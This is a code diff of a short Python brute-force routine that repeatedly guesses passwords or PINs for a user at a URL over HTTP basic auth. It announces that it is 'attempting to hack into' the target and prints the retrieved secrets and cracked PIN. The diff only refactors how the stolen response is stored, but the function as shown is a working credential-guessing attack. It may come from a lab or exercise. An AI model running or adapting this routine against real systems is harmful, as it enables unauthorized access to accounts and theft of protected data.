@@ -5,18 +5,20 @@ def iter_test(url, user, generator, num_attempts=1000):
     count = 0
     success = False
     solver = (guess for guess in generator())
+    secret_info = None
     print(f"Task: Attempting to hack into {url}")
     while count < num_attempts:
         password = next(solver)
         response = get(url, auth=(user, password))
         if response.ok:
             success = True
+            secret_info = response.text
             break
         count += 1
         if count % 100 == 0:
             print(f"Still not cracked {url} after {count} attempts")
     if success:
-        print(f"Success!!!! Secrets: {response.text}")
+        print(f"Success!!!! Secrets: {secret_info}")
         print(f"The pin number was {password}")
         print(f"Attempt: {count}")
     else:
